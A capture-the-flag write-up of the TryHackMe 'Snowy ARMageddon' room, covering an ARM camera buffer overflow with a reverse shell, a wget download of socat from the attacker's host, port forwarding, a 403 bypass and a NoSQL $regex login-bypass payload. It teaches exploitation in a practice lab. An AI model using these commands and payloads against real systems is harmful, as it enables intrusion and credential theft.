# TryHackMe - Snowy ARMageddon

> *These notes were written with AI assistance for English clarity. Attack paths and commands reflect my own work on the room.*

**Difficulty:** Hard  
**Category:** ARM exploitation, Web, NoSQL  
**Room:** [Snowy ARMageddon](https://tryhackme.com/room/armageddon2r)  
**Access:** Hidden QR code in AoC Day 6 (memory corruption / Konami code)

## Introduction

Advent of Cyber '23 — Side Quest 2. An emulated ARM IP camera, a buffer overflow, port forwarding with static socat, and NoSQL injection against MongoDB.

**Objectives:**
- Exploit the camera firmware and retrieve the on-screen flag
- Port-forward to the internal web app and obtain `yetikey2.txt`

---

## Reconnaissance

The room warns against noisy scanning — aggressive probes can close port 50628.

### Nmap

```bash
nmap -sS -p- <TARGET_IP>
nmap -sV -sC -p 22,23,8080,50628 <TARGET_IP>
```

Typical open ports:

| Port | Service |
|------|---------|
| 22 | OpenSSH 8.2 |
| 23 | tcpwrapped |
| 8080 | Apache 2.4.57 — **403 Forbidden** externally |
| 50628 | IP camera / HTTP redirect |

Port **50628** may close if scanned too aggressively (`-sT` full connect). Keep recon lightweight.

---

## Enumeration

### NC-227WF camera interface

Browse `http://<TARGET_IP>:50628/` — **NC-227WF HD 720P** surveillance camera (CyberPolice).

Basic login exists (`admin` user confirmed). Brute-force is a dead end; the intended path is **buffer overflow**.

Reference: [ARM-X Challenge - Breaking the webs](https://no-sec.net/arm-x-challenge-breaking-the-webs/)

---

## Exploitation

### Flag 1 — ARM buffer overflow → reverse shell

The camera login is vulnerable to BOF. Payload includes ARM shellcode connecting back to your listener.

**Critical points:**
- Target is an **emulated ARM** system (verify via `/proc/cpuinfo` after shell)
- Shellcode encodes listener IP — watch **bad characters**:
  - `0x0a` (newline) — avoid literal `10` in IP octets (use `8+2` arithmetic)
  - `0x00` (null byte)

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — run adapted exploit script
python3 exploit.py
```

You receive a **root** shell on the camera emulator.

#### Camera credentials

```bash
cat /var/etc/umconfig.txt
```

→ Web interface credentials for the camera.

Log in at `http://<TARGET_IP>:50628/`, click **Enter** — video feed shows Frosteau's desk with the flag on screen.

---

### Flag 2 — yetikey2.txt via port forwarding + NoSQL

From the reverse shell, port **8080** (PHP + MongoDB app) is only reachable locally (`10.10.x.x:8080`).

#### ARM socat port forward

socat is not installed — use a static ARM binary:

```bash
# Attacker — serve binary
python3 -m http.server 8000

# Target (reverse shell)
wget http://<YOUR_IP>:8000/socat-armel-static
chmod +x socat-armel-static
```

Port 50628 is held by `webs` (camera process). Replace it with forwarding:

```bash
./netstat-armel-static -tulpen   # find webs PID
kill <PID_webs>; ./socat-armel-static tcp-listen:50628,fork,reuseaddr tcp:10.10.x.x:8080
```

`webs` may restart — run `kill` and socat quickly in one line.

Now `http://<TARGET_IP>:50628/` reaches the internal PHP app.

#### Web enumeration — 403 bypass

Most paths return 403. **Trailing slash** after `.php` bypasses it:

```
/login.php/123   → 200 OK
/index.php/
/logout.php/
```

Headers indicate PHP 8.1.26 and MongoDB (leaf logo).

```bash
ffuf -u http://<TARGET_IP>:50628/FUZZ/ -w /usr/share/wordlists/dirb/common.txt -fs 933
```

#### NoSQL injection — authentication bypass

Intercept login POST in Burp:

```
POST /login.php/123 HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin
```

MongoDB + PHP accepts array syntax: `username[$regex]=...`

**Bypass payload:**

```
username[$regex]=Frosteau&password[$regex]=.*
```

→ 302 redirect + `PHPSESSID` cookie.

Visit `/index.php/` with the cookie → Frosteau's CyberPolice dashboard displays `yetikey2.txt`.

Optional: enumerate users with a NoSQL fuzzer script against the login endpoint.

---

## Flags

| Objective | How to obtain |
|-----------|---------------|
| On-screen flag | BOF → creds → camera web UI video feed |
| yetikey2.txt | socat forward → NoSQL bypass → Frosteau dashboard |

*Values intentionally omitted. Complete the room on [TryHackMe](https://tryhackme.com/room/armageddon2r).*

---

## Conclusion

### What I learned

| Skill | Detail |
|-------|--------|
| ARM exploitation | BOF on emulated camera firmware, bad chars in shellcode |
| Static socat (ARM) | Port forwarding when no native tools exist |
| Trailing slash bypass | `/login.php/` evades Apache 403 rules |
| NoSQL injection | `$regex` auth bypass via PHP array parameters |
| Stealth recon | Loud scans can close sensitive ports |

Side quest combining embedded ARM exploitation, tunneling, and modern NoSQL web attacks.
